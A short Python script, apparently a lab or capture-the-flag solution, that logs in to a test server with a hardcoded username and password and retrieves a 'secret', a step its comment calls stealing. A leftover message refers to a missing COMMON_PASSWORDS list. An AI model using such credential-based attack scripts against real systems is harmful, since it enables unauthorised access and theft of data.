#!/usr/bin/env python3

from test_client import TestClient, ClientException
import sys

ADDR = sys.argv[1]
PORT = int(sys.argv[2])

USERNAME = "danguernsey"

password = "Plz2RememberPassword"


def main():
    try:
        t = TestClient(ADDR, PORT)
        t.authenticate(USERNAME, password)
        print(f"Auth success with {USERNAME!r} / {password!r}")

            # once authenticated, try to steal the secret
        secret = t.get_secret()
        
        print("Secret as string (best effort):", secret.split(b"\x00")[0])
        t.close()
        return
    except ClientException as e:
        print(f"Auth failed: {e}")
    except Exception as e:
        print(f"Error talking to server: {e}")         
        

    print("No password in COMMON_PASSWORDS matched")

if __name__ == "__main__":
    main()
